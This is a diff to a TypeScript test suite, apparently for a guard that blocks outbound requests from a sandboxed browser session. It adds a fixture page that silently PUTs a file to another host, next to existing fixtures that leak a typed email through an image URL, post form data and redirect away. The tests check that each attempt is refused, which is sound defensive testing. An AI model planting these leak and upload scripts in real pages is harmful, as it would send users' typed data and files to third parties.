@@ -39,6 +39,7 @@ function pageFor(name: string): string {
 		"read-post": send(`"x"`),
 		"read-post-data": send(`"email=${EMAIL}"`),
 		"read-upload": `<script>const d = new FormData(); d.append("cv", new Blob(["%PDF-1.4"], { type: "application/pdf" }), "cv.pdf"); fetch("${other}/upload", { method: "POST", body: d, mode: "no-cors" }).catch(() => {});</script>`,
+		"read-put": `<script>fetch("${other}/upload", { method: "PUT", body: new Blob(["%PDF-1.4"], { type: "application/pdf" }) }).catch(() => {});</script>`,
 		"read-leak": `<input id="email"><script>document.getElementById("email").addEventListener("change", (e) => { new Image().src = "${other}/asset.png?d=" + encodeURIComponent(e.target.value); });</script>`,
 		"read-redirect": `<img src="${other}/redirect">`,
 		"read-navigate": `<script>setTimeout(() => { location.href = "${other}/asset"; }, 200);</script>`,
@@ -158,6 +159,12 @@ describe("asset and scoring hosts in a real submission's session", () => {
 		expect(away).toEqual([]);
 	});
 
+	it("never get a raw file (a presigned PUT): refused, and the run stops", async () => {
+		const { log, away } = await open("read-put", ASSET);
+		expect(violations(log).map((r) => r.method)).toEqual(["PUT"]);
+		expect(away).toEqual([]);
+	});
+
 	it("never get a typed value in a URL: refused, and the run stops", async () => {
 		const { log, away } = await open("read-leak", ASSET, EMAIL);
 		expect(violations(log).map((r) => r.url)).toEqual([
@@ -201,6 +208,12 @@ describe("asset and scoring hosts in a real submission's session", () => {
 });
 
 describe("hosts that are neither destinations nor asset hosts", () => {
+	it("never get a raw file either: refused, and the run stops", async () => {
+		const { log, away } = await open("read-put", NONE);
+		expect(violations(log).map((r) => r.method)).toEqual(["PUT"]);
+		expect(away).toEqual([]);
+	});
+
 	it("are refused quietly (analytics, error reports) and the run goes on", async () => {
 		for (const rules of [NONE, undefined]) {
 			const { log, away } = await open("analytics", rules);
